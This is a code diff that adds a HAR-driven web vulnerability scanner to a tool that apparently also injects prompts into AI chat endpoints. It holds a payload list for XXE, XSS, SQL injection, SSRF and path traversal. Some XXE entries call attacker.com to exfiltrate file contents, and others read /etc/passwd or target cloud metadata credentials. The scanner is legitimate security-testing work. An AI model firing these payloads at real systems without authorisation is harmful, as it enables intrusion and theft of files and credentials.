@@ -1,5 +1,6 @@
 import { mkdir, readFile, writeFile } from "node:fs/promises";
 import { dirname, resolve } from "node:path";
+import { randomUUID } from "node:crypto";
 import { chromium, type Page } from "playwright";
 import {
   createBuiltinAttackRegistry,
@@ -84,6 +85,51 @@ export interface WebScanRunResult {
     errors: number;
   };
   cases: WebScanCaseResult[];
+}
+
+export interface WebVulnScanConfig {
+  id: string;
+  target: string;
+  harPath: string;
+  vulns: WebVulnScanEntry[];
+  timeoutMs?: number;
+}
+
+export type WebVulnScanEntry = {
+  type: string;
+  enabled?: boolean;
+} & (
+  | { type: "xxe" }
+  | { type: "xss" }
+  | { type: "sqli" }
+  | { type: "ssrf" }
+  | { type: "path-traversal" }
+);
+
+export interface WebVulnFinding {
+  id: string;
+  vulnType: string;
+  severity: "critical" | "high" | "medium" | "low" | "info";
+  url: string;
+  method: string;
+  payload: string;
+  evidence: string;
+  reproCurl: string;
+  confirmed: boolean;
+}
+
+export interface WebVulnScanResult {
+  scanId: string;
+  target: string;
+  summary: {
+    total: number;
+    critical: number;
+    high: number;
+    medium: number;
+    low: number;
+    info: number;
+  };
+  findings: WebVulnFinding[];
 }
 
 export async function recordHar(options: RecordHarOptions): Promise<void> {
@@ -171,6 +217,16 @@ export async function loadWebScanConfig(filePath: string): Promise<WebScanConfig
     throw new Error("Invalid web scan config");
   }
   return normalizeWebScanConfigPaths(parsed, filePath);
+}
+
+export async function loadWebVulnScanConfig(filePath: string): Promise<WebVulnScanConfig> {
+  const content = await readFile(filePath, "utf8");
+  const interpolated = interpolateEnv(content);
+  const parsed = JSON.parse(interpolated) as unknown;
+  if (!isWebVulnScanConfig(parsed)) {
+    throw new Error("Invalid web vuln scan config");
+  }
+  return normalizeWebVulnScanConfigPaths(parsed, filePath);
 }
 
 export async function runWebScan(config: WebScanConfig): Promise<WebScanRunResult> {
@@ -265,6 +321,653 @@ export async function runWebScan(config: WebScanConfig): Promise<WebScanRunResul
     },
     cases,
   };
+}
+
+export async function runWebVulnScan(config: WebVulnScanConfig): Promise<WebVulnScanResult> {
+  const har = await readHar(config.harPath);
+  const endpoints = extractHarEndpoints(har);
+  const enabledVulns = config.vulns.filter((v) => v.enabled !== false);
+  const findings: WebVulnFinding[] = [];
+  const timeoutMs = config.timeoutMs ?? 10_000;
+
+  for (const endpoint of endpoints) {
+    const baseline = await sendBaselineRequest(endpoint, timeoutMs);
+
+    for (const vuln of enabledVulns) {
+      const payloads = getPayloadsForVulnType(vuln.type);
+
+      for (const payload of payloads) {
+        const injectedRequests = injectPayload(endpoint, payload, vuln.type);
+
+        for (const injected of injectedRequests) {
+          const result = await sendVulnProbe(injected, timeoutMs);
+          const detection = detectVulnerability(vuln.type, payload, result, baseline);
+
+          if (detection.detected) {
+            findings.push({
+              id: randomUUID(),
+              vulnType: vuln.type,
+              severity: detection.severity,
+              url: injected.url,
+              method: injected.method,
+              payload: payload.value,
+              evidence: detection.evidence,
+              reproCurl: buildVulnReproCurl(injected),
+              confirmed: detection.confirmed,
+            });
+          }
+        }
+      }
+    }
+  }
+
+  return {
+    scanId: config.id,
+    target: config.target,
+    summary: {
+      total: findings.length,
+      critical: findings.filter((f) => f.severity === "critical").length,
+      high: findings.filter((f) => f.severity === "high").length,
+      medium: findings.filter((f) => f.severity === "medium").length,
+      low: findings.filter((f) => f.severity === "low").length,
+      info: findings.filter((f) => f.severity === "info").length,
+    },
+    findings,
+  };
+}
+
+type VulnPayload = {
+  value: string;
+  injectionPoint: "query" | "body" | "header" | "xml-body";
+};
+
+type HarEndpoint = {
+  method: string;
+  url: string;
+  headers: Array<{ name: string; value: string }>;
+  postData?: { text?: string; mimeType?: string };
+};
+
+type VulnProbeRequest = {
+  method: string;
+  url: string;
+  headers: Record<string, string>;
+  body?: string;
+};
+
+type VulnProbeResponse = {
+  status: number;
+  body: string;
+  latencyMs: number;
+};
+
+type BaselineResponse = {
+  status: number;
+  body: string;
+  bodyLength: number;
+};
+
+type DetectionResult = {
+  detected: boolean;
+  severity: "critical" | "high" | "medium" | "low" | "info";
+  evidence: string;
+  confirmed: boolean;
+};
+
+function extractHarEndpoints(har: any): HarEndpoint[] {
+  const entries: any[] = har?.log?.entries ?? [];
+  const endpoints: HarEndpoint[] = [];
+
+  for (const entry of entries) {
+    const req = entry?.request;
+    if (!req?.url || !req?.method) {
+      continue;
+    }
+
+    const method = String(req.method).toUpperCase();
+    const url = String(req.url);
+
+    if (!["GET", "POST", "PUT", "PATCH", "DELETE"].includes(method)) {
+      continue;
+    }
+
+    const headers: Array<{ name: string; value: string }> = [];
+    if (Array.isArray(req.headers)) {
+      for (const h of req.headers) {
+        if (typeof h?.name === "string" && typeof h?.value === "string") {
+          headers.push({ name: h.name, value: h.value });
+        }
+      }
+    }
+
+    const endpoint: HarEndpoint = { method, url, headers };
+
+    if (req.postData) {
+      endpoint.postData = {
+        text: typeof req.postData.text === "string" ? req.postData.text : undefined,
+        mimeType: typeof req.postData.mimeType === "string" ? req.postData.mimeType : undefined,
+      };
+    }
+
+    endpoints.push(endpoint);
+  }
+
+  return endpoints;
+}
+
+function getPayloadsForVulnType(vulnType: string): VulnPayload[] {
+  const registry: Record<string, VulnPayload[]> = {
+    xxe: [
+      { value: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', injectionPoint: "xml-body" },
+      { value: '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>', injectionPoint: "xml-body" },
+      { value: '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%send;]><root/>', injectionPoint: "xml-body" },
+      { value: '+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-', injectionPoint: "xml-body" },
+      { value: '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></body></foreignObject></svg>', injectionPoint: "xml-body" },
+    ],
+    xss: [
+      { value: "<script>alert(1)</script>", injectionPoint: "query" },
+      { value: '<img src=x onerror=alert(1)>', injectionPoint: "query" },
+      { value: "<svg onload=alert(1)>", injectionPoint: "query" },
+      { value: "<body onload=alert(1)>", injectionPoint: "query" },
+      { value: "%3Cscript%3Ealert(1)%3C/script%3E", injectionPoint: "query" },
+      { value: "${alert(1)}", injectionPoint: "query" },
+    ],
+    sqli: [
+      { value: "' OR '1'='1", injectionPoint: "query" },
+      { value: "' UNION SELECT NULL,NULL,NULL--", injectionPoint: "query" },
+      { value: "' AND 1=CONVERT(int,(SELECT @@version))--", injectionPoint: "query" },
+      { value: "' WAITFOR DELAY '0:0:5'--", injectionPoint: "query" },
+      { value: "' AND 1=1--", injectionPoint: "query" },
+    ],
+    ssrf: [
+      { value: "http://127.0.0.1/admin", injectionPoint: "query" },
+      { value: "http://169.254.169.254/latest/meta-data/", injectionPoint: "query" },
+      { value: "http://metadata.google.internal/computeMetadata/v1/", injectionPoint: "query" },
+      { value: "http://0.0.0.0/", injectionPoint: "query" },
+      { value: "http://localtest.me/", injectionPoint: "query" },
+    ],
+    "path-traversal": [
+      { value: "../../../etc/passwd", injectionPoint: "query" },
+      { value: "..%2F..%2F..%2Fetc%2Fpasswd", injectionPoint: "query" },
+      { value: "....//....//....//etc/passwd", injectionPoint: "query" },
+      { value: "../../../etc/passwd%00.png", injectionPoint: "query" },
+      { value: "..%c0%af..%c0%af..%c0%afetc/passwd", injectionPoint: "query" },
+    ],
+  };
+
+  return registry[vulnType] ?? [];
+}
+
+function injectPayload(endpoint: HarEndpoint, payload: VulnPayload, vulnType: string): VulnProbeRequest[] {
+  const requests: VulnProbeRequest[] = [];
+  const headers = normalizeHeaders(endpoint.headers);
+
+  if (payload.injectionPoint === "xml-body") {
+    requests.push({
+      method: "POST",
+      url: endpoint.url,
+      headers: { ...headers, "content-type": "application/xml" },
+      body: payload.value,
+    });
+    if (endpoint.method !== "POST") {
+      requests.push({
+        method: endpoint.method,
+        url: endpoint.url,
+        headers: { ...headers, "content-type": "application/xml" },
+        body: payload.value,
+      });
+    }
+    return requests;
+  }
+
+  if (payload.injectionPoint === "header") {
+    const injectedHeaders = { ...headers, "x-forwarded-for": payload.value };
+    requests.push({
+      method: endpoint.method,
+      url: endpoint.url,
+      headers: injectedHeaders,
+      body: endpoint.postData?.text,
+    });
+    return requests;
+  }
+
+  const urlObj = new URL(endpoint.url);
+  const queryParams = Array.from(urlObj.searchParams.entries());
+
+  if (payload.injectionPoint === "query") {
+    if (queryParams.length > 0) {
+      for (const [key] of queryParams) {
+        const testUrl = new URL(endpoint.url);
+        testUrl.searchParams.set(key, payload.value);
+        requests.push({
+          method: endpoint.method,
+          url: testUrl.toString(),
+          headers,
+          body: endpoint.postData?.text,
+        });
+      }
+    } else {
+      const testUrl = new URL(endpoint.url);
+      testUrl.searchParams.set("q", payload.value);
+      requests.push({
+        method: endpoint.method,
+        url: testUrl.toString(),
+        headers,
+        body: endpoint.postData?.text,
+      });
+      requests.push({
+        method: "POST",
+        url: endpoint.url,
+        headers: { ...headers, "content-type": "application/x-www-form-urlencoded" },
+        body: `input=${encodeURIComponent(payload.value)}`,
+      });
+      requests.push({
+        method: "POST",
+        url: endpoint.url,
+        headers: { ...headers, "content-type": "application/json" },
+        body: JSON.stringify({ input: payload.value, query: payload.value, data: payload.value }),
+      });
+    }
+  }
+
+  if (payload.injectionPoint === "query" || payload.injectionPoint === "body") {
+    const bodyText = endpoint.postData?.text;
+    if (bodyText) {
+      const mimeType = endpoint.postData?.mimeType ?? "";
+
+      if (mimeType.includes("application/json")) {
+        try {
+          const parsed = JSON.parse(bodyText) as Record<string, unknown>;
+          const injected = injectPayloadIntoJsonFields(parsed, payload.value);
+          requests.push({
+            method: endpoint.method,
+            url: endpoint.url,
+            headers,
+            body: JSON.stringify(injected),
+          });
+        } catch {
+          requests.push({
+            method: endpoint.method,
+            url: endpoint.url,
+            headers,
+            body: payload.value,
+          });
+        }
+      } else if (mimeType.includes("application/x-www-form-urlencoded")) {
+        try {
+          const params = new URLSearchParams(bodyText);
+          const keys = Array.from(params.keys());
+          for (const key of keys) {
+            const injected = new URLSearchParams(bodyText);
+            injected.set(key, payload.value);
+            requests.push({
+              method: endpoint.method,
+              url: endpoint.url,
+              headers,
+              body: injected.toString(),
+            });
+          }
+        } catch {
+          requests.push({
+            method: endpoint.method,
+            url: endpoint.url,
+            headers,
+            body: payload.value,
+          });
+        }
+      } else {
+        requests.push({
+          method: endpoint.method,
+          url: endpoint.url,
+          headers,
+          body: payload.value,
+        });
+      }
+    } else if (endpoint.method === "GET" || endpoint.method === "HEAD") {
+      requests.push({
+        method: "POST",
+        url: endpoint.url,
+        headers: { ...headers, "content-type": "application/x-www-form-urlencoded" },
+        body: `input=${encodeURIComponent(payload.value)}`,
+      });
+      requests.push({
+        method: "POST",
+        url: endpoint.url,
+        headers: { ...headers, "content-type": "application/json" },
+        body: JSON.stringify({ input: payload.value, query: payload.value, data: payload.value }),
+      });
+    }
+  }
+
+  return requests.length > 0 ? requests : [{
+    method: endpoint.method,
+    url: endpoint.url,
+    headers,
+    body: endpoint.postData?.text,
+  }];
+}
+
+function injectPayloadIntoJsonFields(obj: Record<string, unknown>, payload: string): Record<string, unknown> {
+  const result: Record<string, unknown> = {};
+  for (const [key, value] of Object.entries(obj)) {
+    if (typeof value === "string") {
+      result[key] = payload;
+    } else if (isRecord(value) && !Array.isArray(value)) {
+      result[key] = injectPayloadIntoJsonFields(value as Record<string, unknown>, payload);
+    } else {
+      result[key] = value;
+    }
+  }
+  return result;
+}
+
+async function sendBaselineRequest(endpoint: HarEndpoint, timeoutMs: number): Promise<BaselineResponse> {
+  const headers = normalizeHeaders(endpoint.headers);
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
+
+  try {
+    const response = await fetch(endpoint.url, {
+      method: endpoint.method,
+      headers,
+      body: ["GET", "HEAD"].includes(endpoint.method) ? undefined : endpoint.postData?.text,
+      signal: controller.signal,
+    });
+
+    const body = await response.text();
+    return { status: response.status, body, bodyLength: body.length };
+  } catch {
+    return { status: 0, body: "", bodyLength: 0 };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+async function sendVulnProbe(request: VulnProbeRequest, timeoutMs: number): Promise<VulnProbeResponse> {
+  const startedAt = Date.now();
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
+
+  try {
+    const response = await fetch(request.url, {
+      method: request.method,
+      headers: request.headers,
+      body: ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
+      signal: controller.signal,
+    });
+
+    const body = await response.text();
+    return { status: response.status, body, latencyMs: Date.now() - startedAt };
+  } catch {
+    return { status: 0, body: "", latencyMs: Date.now() - startedAt };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+function detectVulnerability(vulnType: string, payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  if (vulnType === "xxe") {
+    return detectXxe(payload, response, baseline);
+  }
+  if (vulnType === "xss") {
+    return detectXss(payload, response, baseline);
+  }
+  if (vulnType === "sqli") {
+    return detectSqli(payload, response, baseline);
+  }
+  if (vulnType === "ssrf") {
+    return detectSsrf(payload, response, baseline);
+  }
+  if (vulnType === "path-traversal") {
+    return detectPathTraversal(payload, response, baseline);
+  }
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function detectXxe(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const passwdPattern = /root:x:0:0|bin:x:\d+:\d+|daemon:x:\d+:\d+/;
+  const match = passwdPattern.exec(response.body);
+  if (match) {
+    return {
+      detected: true,
+      severity: "critical",
+      evidence: `File content detected in response: ${match[0]}`,
+      confirmed: true,
+    };
+  }
+
+  if (response.status !== baseline.status && response.body.length !== baseline.bodyLength && response.body.length > baseline.bodyLength) {
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Response differs from baseline (status ${response.status} vs ${baseline.status}, length ${response.body.length} vs ${baseline.bodyLength})`,
+      confirmed: false,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function detectXss(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const decodedPayload = decodeURIComponent(payload.value);
+  if (response.body.includes(decodedPayload) || response.body.includes(payload.value)) {
+    return {
+      detected: true,
+      severity: "high",
+      evidence: `Payload reflected unescaped in response: ${decodedPayload.substring(0, 80)}`,
+      confirmed: true,
+    };
+  }
+
+  const lowerBody = response.body.toLowerCase();
+  const scriptPatterns = ["<script", "onerror=", "onload=", "onmouseover="];
+  for (const pattern of scriptPatterns) {
+    if (lowerBody.includes(pattern) && !baseline.body.toLowerCase().includes(pattern)) {
+      return {
+        detected: true,
+        severity: "medium",
+        evidence: `Script pattern found in response that was not in baseline: ${pattern}`,
+        confirmed: false,
+      };
+    }
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function detectSqli(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const sqlErrorPatterns = [
+    /sql syntax.*mysql/i,
+    /warning.*mysql/i,
+    /valid mysql result/i,
+    /check the manual that (corresponds to|fits) your mysql server/i,
+    /postgresql.*error/i,
+    /warning.*pg_/i,
+    /valid postgresql result/i,
+    /nativeclient.*microsoft.*sql/i,
+    /odbc sql server driver/i,
+    /sqlserver.*jdbc/i,
+    /oracle.*driver/i,
+    /ora-\d{5}/i,
+    /quoted string not properly terminated/i,
+    /sql command not properly ended/i,
+    /microsoft access driver/i,
+    /jetcdbengine/i,
+    /sqlite.*error/i,
+    /sqlite3::/i,
+  ];
+
+  for (const pattern of sqlErrorPatterns) {
+    const match = pattern.exec(response.body);
+    if (match) {
+      return {
+        detected: true,
+        severity: "critical",
+        evidence: `SQL error message detected: ${match[0]}`,
+        confirmed: true,
+      };
+    }
+  }
+
+  if (baseline.status > 0 && response.status !== baseline.status) {
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Response status differs from baseline (${response.status} vs ${baseline.status})`,
+      confirmed: false,
+    };
+  }
+
+  if (baseline.bodyLength > 0 && Math.abs(response.body.length - baseline.bodyLength) > baseline.bodyLength * 0.5) {
+    return {
+      detected: true,
+      severity: "low",
+      evidence: `Response length significantly different from baseline (${response.body.length} vs ${baseline.bodyLength})`,
+      confirmed: false,
+    };
+  }
+
+  if (response.latencyMs >= 4500 && payload.value.includes("WAITFOR")) {
+    return {
+      detected: true,
+      severity: "high",
+      evidence: `Time-based SQL injection detected (response took ${response.latencyMs}ms)`,
+      confirmed: true,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function detectSsrf(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const metadataPatterns = [
+    /ami-id/i,
+    /instance-id/i,
+    /computeMetadata/i,
+    /iam security credentials/i,
+    /instance-identity/i,
+  ];
+
+  for (const pattern of metadataPatterns) {
+    const match = pattern.exec(response.body);
+    if (match) {
+      return {
+        detected: true,
+        severity: "critical",
+        evidence: `Cloud metadata content detected: ${match[0]}`,
+        confirmed: true,
+      };
+    }
+  }
+
+  if (baseline.status === 0 && response.status > 0 && response.status < 400) {
+    return {
+      detected: true,
+      severity: "high",
+      evidence: `Internal service responded (status ${response.status}) when baseline was unreachable`,
+      confirmed: false,
+    };
+  }
+
+  if (response.status >= 200 && response.status < 300 && baseline.status !== response.status) {
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Different response from internal endpoint (${response.status} vs baseline ${baseline.status})`,
+      confirmed: false,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function detectPathTraversal(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const fileContentPatterns = [
+    /root:x:0:0/,
+    /\[boot loader\]/i,
+    /nfsnobody:x:/,
+    /\/bin\/bash/,
+    /\/bin\/sh/,
+  ];
+
+  for (const pattern of fileContentPatterns) {
+    const match = pattern.exec(response.body);
+    if (match && !pattern.exec(baseline.body)) {
+      return {
+        detected: true,
+        severity: "critical",
+        evidence: `File content detected in response: ${match[0]}`,
+        confirmed: true,
+      };
+    }
+  }
+
+  if (response.status !== baseline.status && response.body.length !== baseline.bodyLength) {
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Response differs from baseline (status ${response.status} vs ${baseline.status})`,
+      confirmed: false,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
+function buildVulnReproCurl(request: VulnProbeRequest): string {
+  const safeHeaders = sanitizeReproHeaders(request.headers);
+  const headerFlags = Object.entries(safeHeaders).flatMap(([key, value]) => [
+    "-H",
+    shellEscape(`${key}: ${value}`),
+  ]);
+
+  const parts = [
+    "curl",
+    "-sS",
+    "-X",
+    shellEscape(request.method),
+    shellEscape(request.url),
+    ...headerFlags,
+  ];
+
+  if (request.body) {
+    parts.push("--data", shellEscape(request.body));
+  }
+
+  return parts.join(" ");
+}
+
+function normalizeWebVulnScanConfigPaths(
+  config: WebVulnScanConfig,
+  filePath: string,
+): WebVulnScanConfig {
+  const configDir = dirname(filePath);
+  return {
+    ...config,
+    harPath: resolve(configDir, config.harPath),
+  };
+}
+
+function isWebVulnScanConfig(value: unknown): value is WebVulnScanConfig {
+  if (!isRecord(value)) {
+    return false;
+  }
+
+  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal"]);
+  const vulns = (value as any).vulns;
+
+  return (
+    typeof (value as any).id === "string" &&
+    typeof (value as any).target === "string" &&
+    typeof (value as any).harPath === "string" &&
+    Array.isArray(vulns) &&
+    vulns.every((item: any) =>
+      isRecord(item) &&
+      typeof item.type === "string" &&
+      validTypes.has(item.type) &&
+      (item.enabled === undefined || typeof item.enabled === "boolean")
+    )
+  );
 }
 
 async function loadSteps(filePath: string): Promise<WebStep[]> {
@@ -593,7 +1296,6 @@ function injectPromptIntoOpenAICompatibleBody(
     cloned.stream = false;
   }
 
-  // Handle OpenAI-compatible shape
   if (Array.isArray((cloned as any).messages)) {
     const messages = [...((cloned as any).messages as any[])];
     const lastUserIndex = findLastUserMessageIndex(messages);
@@ -609,7 +1311,6 @@ function injectPromptIntoOpenAICompatibleBody(
     return cloned;
   }
 
-  // Handle custom API shapes
   if (typeof cloned.prompt === "string") {
     cloned.prompt = prompt;
     return cloned;
@@ -691,7 +1392,6 @@ function readOpenAICompatibleText(body: unknown): string | undefined {
     return undefined;
   }
 
-  // Handle standard OpenAI shape
   if (Array.isArray((body as any).choices)) {
     for (const choice of (body as any).choices) {
       if (!isRecord(choice)) {
@@ -707,7 +1407,6 @@ function readOpenAICompatibleText(body: unknown): string | undefined {
     }
   }
 
-  // Handle common custom shapes
   if (typeof (body as any).response === "string") {
     return (body as any).response;
   }
